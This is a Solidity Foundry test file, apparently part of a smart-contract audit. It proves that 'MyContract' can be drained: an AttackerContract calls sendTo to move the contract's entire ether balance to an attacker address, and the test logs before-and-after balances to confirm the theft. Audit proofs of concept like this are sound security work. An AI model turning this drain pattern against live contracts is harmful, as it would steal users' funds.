// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/mycontract.sol";

contract MyContractAuditTest is Test {
    MyContract public myContract;
    address public owner = address(0x1);
    address public attacker = address(0x2);

    function setUp() public {
        vm.prank(owner);
        myContract = new MyContract();
        vm.deal(address(myContract), 1 ether);
    }

    function test_ArbitrarySenderCanWithdrawEther() public {
        console2.log("--- BEFORE-Trigger State ---");
        // External state
        uint256 initialContractBalance = address(myContract).balance;
        uint256 initialAttackerBalance = attacker.balance;
        console2.log("Contract ETH balance:", initialContractBalance);
        console2.log("Attacker ETH balance:", initialAttackerBalance);
        
        // Internal state (differential validation)
        uint256 contractBalInternalBefore = myContract.getContractBalance();
        uint256 totalTransfersBefore = myContract.totalTransfers();
        uint256 recipientBalAttackerBefore = myContract.recipientBalances(attacker);
        console2.log("Internal ETH balance (contract):", contractBalInternalBefore);
        console2.log("Total transfers count:", totalTransfersBefore);
        console2.log("Attacker recorded balance:", recipientBalAttackerBefore);

        // Deploy attacker contract
        AttackerContract attackerContract = new AttackerContract(myContract, attacker);
        
        console2.log("--- Trigger Attack Operation ---");
        vm.startPrank(owner, owner);
        attackerContract.executeAttack();  // Critical attack tx
        vm.stopPrank();

        console2.log("--- AFTER-Trigger State ---");
        // External state changes
        uint256 currentContractBalance = address(myContract).balance;
        uint256 currentAttackerBalance = attacker.balance;
        console2.log("Contract ETH balance:", currentContractBalance);
        console2.log("Attacker ETH balance:", currentAttackerBalance);
        
        // Internal state (for differential validation)
        uint256 contractBalInternalAfter = myContract.getContractBalance();
        uint256 totalTransfersAfter = myContract.totalTransfers();
        uint256 recipientBalAttackerAfter = myContract.recipientBalances(attacker);
        console2.log("Internal ETH balance (contract):", contractBalInternalAfter);
        console2.log("Total transfers count:", totalTransfersAfter);
        console2.log("Attacker recorded balance:", recipientBalAttackerAfter);

        // Evaluation: Check exploitation conditions
        bool fundsStolen = (currentContractBalance == 0) && 
                           (currentAttackerBalance == initialAttackerBalance + initialContractBalance);
        
        bool internalStateUpdated = (contractBalInternalAfter == 0) &&
                                    (totalTransfersAfter == totalTransfersBefore + 1) && 
                                    (recipientBalAttackerAfter == recipientBalAttackerBefore + initialContractBalance);
        
        // Vulnerability verdict
        if (fundsStolen && internalStateUpdated) {
            console2.log("Vulnerability Exists: Attack succeeded with ETH stolen and internal state updated");
        } else {
            string memory reason = "Attack failed to meet exploitation conditions";
            console2.log("Vulnerability not Exist:", reason);
        }
    }
}

contract AttackerContract {
    MyContract public targetContract;
    address public attacker;

    constructor(MyContract _targetContract, address _attacker) {
        targetContract = _targetContract;
        attacker = _attacker;
    }

    function executeAttack() external {
        uint256 contractBalance = address(targetContract).balance;
        targetContract.sendTo(attacker, contractBalance);
    }
}